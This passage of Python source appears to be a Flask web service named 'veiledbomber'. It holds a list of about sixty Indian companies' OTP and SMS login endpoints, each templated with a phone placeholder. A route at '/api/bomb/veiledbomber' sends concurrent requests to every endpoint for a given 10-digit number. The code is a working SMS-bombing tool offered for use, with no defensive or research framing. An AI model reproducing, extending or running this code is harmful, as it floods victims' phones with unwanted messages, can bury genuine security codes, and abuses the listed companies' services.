        "url": "https://jiffy.spencers.in/user/auth/otp/send",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "PayMe India",
        "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}", "app_signature": "S10ePIIrbH3"},
        "form_data": None
    },
    {
        "name": "Shopper's Stop",
        "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}", "type": "SIGNIN_WITH_MOBILE"},
        "form_data": None
    },
    {
        "name": "Hyuga Auth",
        "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "BigCash",
        "url": "https://www.bigcash.live/sendsms.php",
        "method": "GET",
        "params": {"mobile": "{phone}", "ip": "192.168.1.1"},
        "headers": {"Referer": "https://www.bigcash.live/games/poker"},
        "json_data": None,
        "form_data": None
    },
    {
        "name": "Lifestyle Stores",
        "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"signInMobile": "{phone}", "channel": "sms"},
        "form_data": None
    },
    {
        "name": "WorkIndia",
        "url": "https://api.workindia.in/api/candidate/profile/login/verify-number/",
        "method": "GET",
        "params": {"mobile_no": "{phone}", "version_number": "623"},
        "headers": {},
        "json_data": None,
        "form_data": None
    },
    {
        "name": "PokerBaazi",
        "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}", "mfa_channels": "phno"},
        "form_data": None
    },
    {
        "name": "Snitch",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile_number": "+91{phone}"},
        "form_data": None
    },
    {
        "name": "BeepKart",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}", "city": 362},
        "form_data": None
    },
    {
        "name": "Lending Plate",
        "url": "https://lendingplate.com/api.php",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "json_data": None,
        "form_data": "mobiles={phone}&resend=Resend"
    },
    {
        "name": "GoKwik",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}", "country": "in"},
        "form_data": None
    },
    {
        "name": "NewMe",
        "url": "https://prodapi.newme.asia/web/otp/request",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile_number": "{phone}", "resend_otp_request": True},
        "form_data": None
    },
    {
        "name": "Univest",
        "url": "https://api.univest.in/api/auth/send-otp",
        "method": "GET",
        "params": {"type": "web4", "countryCode": "91", "contactNumber": "{phone}"},
        "headers": {},
        "json_data": None,
        "form_data": None
    },
    {
        "name": "Smytten",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}", "email": "test@example.com"},
        "form_data": None
    },
    {
        "name": "CaratLane",
        "url": "https://www.caratlane.com/cg/dhevudu",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"query": "mutation {SendOtp(input: {mobile: \"{phone}\",isdCode: \"91\",otpType: \"registerOtp\"}) {status {message code}}}"},
        "form_data": None
    },
    {
        "name": "BikeFixup",
        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "json_data": {"phone": "{phone}", "app_signature": "4pFtQJwcz6y"},
        "form_data": None
    },
    {
        "name": "WellAcademy",
        "url": "https://wellacademy.in/store/api/numberLoginV2",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "json_data": {"contact_no": "{phone}"},
        "form_data": None
    },
    {
        "name": "Shemaroome",
        "url": "https://www.shemaroome.com/users/resend_otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "json_data": None,
        "form_data": "mobile_no=%2B91{phone}"
    },
    {
        "name": "Cossouq",
        "url": "https://www.cossouq.com/mobilelogin/otp/send",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "json_data": None,
        "form_data": "mobilenumber={phone}&otptype=register"
    },
    {
        "name": "MyImagineStore",
        "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "json_data": None,
        "form_data": "mobile={phone}"
    },
    {
        "name": "Otpless",
        "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}", "selectedCountryCode": "+91"},
        "form_data": None
    },
    {
        "name": "MyHubble Money",
        "url": "https://api.myhubble.money/v1/auth/otp/generate",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phoneNumber": "{phone}", "channel": "SMS"},
        "form_data": None
    },
    {
        "name": "Tata Capital Business",
        "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobileNumber": "{phone}", "deviceOs": "Android", "sourceName": "MitayeFaasleWebsite"},
        "form_data": None
    },
    {
        "name": "DealShare",
        "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}", "hashCode": "k387IsBaTmn"},
        "form_data": None
    },
    {
        "name": "Snapmint",
        "url": "https://api.snapmint.com/v1/public/sign_up",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "Housing.com",
        "url": "https://login.housing.com/api/v2/send-otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}", "country_url_name": "in"},
        "form_data": None
    },
    {
        "name": "RentoMojo",
        "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "Khatabook",
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}", "app_signature": "wk+avHrHZf2"},
        "form_data": None
    },
    {
        "name": "Animall",
        "url": "https://animall.in/zap/auth/login",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}", "signupPlatform": "NATIVE_ANDROID"},
        "form_data": None
    },
    # Additional categories APIs
    {
        "name": "Paytm Money",
        "url": "https://wealth.paytmmoney.com/api/v3/user/send-otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "Groww OTP",
        "url": "https://groww.in/v1/otp/send",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}", "appId": "growwWeb", "event": "login"},
        "form_data": None
    },
    {
        "name": "Kotak Securities",
        "url": "https://trade.kotaksecurities.com/trade/OtpAPI",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "json_data": None,
        "form_data": "mobileNo={phone}&action=sendOTP"
    },
    {
        "name": "Angel Broking",
        "url": "https://smartapi.angelbroking.com/publisher-login",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Zerodha OTP",
        "url": "https://kite.zerodha.com/api/login",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "json_data": None,
        "form_data": "user_id={phone}"
    },
    {
        "name": "Oyo OTP",
        "url": "https://secure.oyoroom.com/api/otp/send",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"country_code": "+91", "phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "Treebo OTP",
        "url": "https://www.treebo.com/api/v4/otp/send",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "FabHotels OTP",
        "url": "https://api.fabhotels.com/auth/send-otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "RedBus OTP",
        "url": "https://secure.redbus.in/secure/otp/send",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "IRCTC OTP",
        "url": "https://www.irctc.co.in/eticketing/sendSMS",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "json_data": None,
        "form_data": "mobileNo={phone}"
    },
    {
        "name": "Practo OTP",
        "url": "https://www.practo.com/api/v3/auth/send-otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "MFine OTP",
        "url": "https://api.mfine.co/auth/v2/send-otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "DocOnline OTP",
        "url": "https://api.doconline.com/api/v1/otp/send",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "Airtel Thanks App",
        "url": "https://www.airtel.in/thanksapp-api/v1/send-otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Jio OTP",
        "url": "https://www.jio.com/api/v1/auth/send-otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "BSNL OTP",
        "url": "https://www.bsnl.co.in/api/otp/send",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Tata Play",
        "url": "https://api.tataplay.com/auth/v1/otp/send",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "Unacademy OTP",
        "url": "https://api.unacademy.com/api/v3/auth/send-otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "Vedantu OTP",
        "url": "https://api.vedantu.com/auth/v2/send-otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Toppr OTP",
        "url": "https://api.toppr.com/v1/auth/send-otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "Byju's Exam",
        "url": "https://api.byjusexamprep.com/v2/otp/send",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "Ajio OTP",
        "url": "https://www.ajio.com/api/v2/auth/send-otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Meesho OTP",
        "url": "https://www.meesho.com/api/v2/auth/send-otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "ShopClues OTP",
        "url": "https://www.shopclues.com/api/v1/user/send-otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Voonik OTP",
        "url": "https://www.voonik.com/api/auth/send-otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "Croma OTP",
        "url": "https://api.croma.com/auth/v1/otp/send",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Zomato SMS",
        "url": "https://www.zomato.com/php/o2_api_handler.php",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "json_data": None,
        "form_data": "phone={phone}&type=sms"
    },
    {
        "name": "Swiggy SMS",
        "url": "https://www.swiggy.com/api/v3/auth/send-otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Domino's OTP",
        "url": "https://order.g.dominos.com/order-api/iam/v1/users/otp/send",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phoneNumber": "{phone}"},
        "form_data": None
    },
    {
        "name": "Pizza Hut",
        "url": "https://api.pizzahut.io/auth/v2/send-otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    }
]

def make_request(api, phone_number):
    """Makes a single HTTP request to an API."""
    # Replace placeholder {phone} with the actual phone number
    url = api['url'].format(phone=phone_number)
    params = api.get('params')
    if params is not None:
        params = {k: v.format(phone=phone_number) if isinstance(v, str) else v for k, v in params.items()}
    else:
        params = {} # Ensure params is a dict if originally None

    headers = api.get('headers', {}).copy()
    json_data = api.get('json_data')
    form_data = api.get('form_data')

    if json_data and isinstance(json_data, dict):
        json_data = {k: v.format(phone=phone_number) if isinstance(v, str) else v for k, v in json_data.items()}
    if form_data and isinstance(form_data, str):
        form_data = form_data.format(phone=phone_number)

    try:
        if api['method'] == 'GET':
            response = requests.get(url, params=params, headers=headers, timeout=TIMEOUT)
        elif api['method'] == 'POST':
            if json_data:
                response = requests.post(url, params=params, json=json_data, headers=headers, timeout=TIMEOUT)
            elif form_data:
                response = requests.post(url, params=params, data=form_data, headers=headers, timeout=TIMEOUT)
            else:
                response = requests.post(url, params=params, headers=headers, timeout=TIMEOUT)
        else:
            # Handle other methods if necessary
            return {'name': api['name'], 'success': False, 'status': 0, 'error': 'Unsupported method'}

        return {
            'name': api['name'],
            'success': 200 <= response.status_code < 300,
            'status': response.status_code,
            'error': response.text[:100] if response.status_code >= 400 else None # Limit error text
        }
    except requests.exceptions.RequestException as e:
        return {
            'name': api['name'],
            'success': False,
            'status': 0,
            'error': str(e)
        }

@app.route('/api/bomb/veiledbomber', methods=['GET'])
def veiled_bomber():
    phone = request.args.get('num', '').strip()

    # Input validation
    if not phone or not re.match(r'^[0-9]{10}$', phone):
        return jsonify({'error': 'Invalid phone number. Must be 10 digits.'}), 400

    # Rate limiting check
    if not check_rate_limit():
        return jsonify({'error': 'Rate limit exceeded. Please try again later.'}), 429

    results = []
    successful = 0
    failed = 0

    # Use ThreadPoolExecutor for concurrent requests
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        # Submit all tasks
        future_to_api = {executor.submit(make_request, api, phone): api for api in APIS}

        # Collect results as they complete
        for future in as_completed(future_to_api):
            result = future.result()
            results.append(result)
            if result['success']:
                successful += 1
            else:
                failed += 1

    # Prepare final response
    response_data = {
        'total_apis_called': len(APIS),
        'successful': successful,
        'failed': failed,
        'phone_number': phone,
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
        'total_apis_count': len(APIS),
        'results': results
    }

    return jsonify(response_data)

if __name__ == '__main__':
    app.run(debug=True)